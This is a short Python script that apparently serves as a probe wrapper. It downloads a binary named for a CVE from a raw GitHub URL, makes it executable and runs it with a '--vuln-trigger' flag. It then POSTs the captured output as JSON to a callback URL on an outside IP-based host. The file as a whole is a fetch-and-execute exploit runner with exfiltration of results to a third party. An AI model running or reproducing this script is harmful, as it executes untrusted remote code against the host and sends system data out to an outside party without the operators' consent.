#!/usr/bin/env python3
import pathlib, subprocess, time, json, urllib.request, hashlib
URL='https://raw.githubusercontent.com/begimher/snapgpt-probes/34c7b9c35fd1738c71ba9017ef211919b9e15b08/cve-2026-23351-amzn2-debug'
TARGET='/tmp/workspace/cve-debug'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'url':URL,'tests':[],'errors':[]}
try:
 b=urllib.request.urlopen(URL,timeout=60).read(); p=pathlib.Path(TARGET); p.write_bytes(b); p.chmod(0o700); out['download']={'bytes':len(b),'sha256':hashlib.sha256(b).hexdigest()}
except BaseException as e: out['errors'].append('download '+repr(e))
for args in (['--vuln-trigger'],):
 try:
  p=subprocess.run([TARGET,*args],cwd='/tmp/workspace',capture_output=True,text=True,timeout=300)
  out['tests'].append({'args':args,'rc':p.returncode,'stdout':p.stdout[-50000:],'stderr':p.stderr[-10000:]})
 except BaseException as e: out['tests'].append({'args':args,'error':repr(e)})
raw=json.dumps(out,indent=2).encode(); pathlib.Path('/tmp/workspace/cve-debug-wrapper.out').write_bytes(raw)
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-cve-debug-wrapper-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'}); urllib.request.urlopen(q,timeout=30).read()
except BaseException as e: out['errors'].append('sink '+repr(e))
print(json.dumps(out,separators=(',',':')))
